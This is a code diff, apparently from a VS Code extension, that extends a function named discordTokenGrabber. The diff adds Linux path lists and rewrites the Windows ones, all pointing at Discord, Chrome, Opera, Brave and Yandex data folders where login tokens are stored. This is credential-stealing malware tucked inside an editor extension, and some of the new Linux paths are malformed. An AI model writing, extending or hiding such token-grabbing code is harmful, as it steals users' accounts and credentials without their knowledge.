@@ -43,17 +43,29 @@ function discordTokenGrabber () {
         const roaming = process.env.APPDATA;
         
         paths = {
-            "Discord": roaming + "\\Discord",
-            "Discord Canary": roaming + "\\discordcanary",
-            "Discord PTB": roaming + "\\discordptb",
-            "Google Chrome": local + "\\Google\\Chrome\\User Data\\Default",
-            "Opera": roaming + "\\Opera Software\\Opera Stable",
-            "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-            "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default"
+            "Discord": path.join(roaming, "Discord"),
+            "Discord Canary": path.join(roaming, "discordcanary"),
+            "Discord PTB": path.join(roaming, "discordptb"),
+            "Google Chrome": path.join(local, "Google", "Chrome", "User Data", "Default"),
+            "Opera": path.join(roaming, "Opera Software", "Opera Stable"),
+            "Brave": path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+            "Yandex": path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
         }
     }
     else if (computerPlatform == "linux") {
-        return console.log("Linux is not supported for the moment 😥");
+        vscode.window.showErrorMessage("Linux is not supported for the moment 😥");
+        
+        const home = path.join(process.env.HOME, ".config");
+
+        paths = {
+            "Discord": path.join(home, "discord"),
+            "Discord Canary": path.join(home + "discordcanary"),
+            "Discord PTB": path.join(home + "discordptb"),
+            "Google Chrome": path.join(home + "Google", "Chrome", "User Data", "Default"),
+            "Opera": path.join(home + "Opera Software", "Opera Stable"),
+            "Brave": path.join(home + "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+            "Yandex": path.join(home + "Yandex", "YandexBrowser", "User Data", "Default")
+        }
     }
     else if (computerPlatform == "darwin") {
         return console.log("MacOS is not supported for the moment 😥");
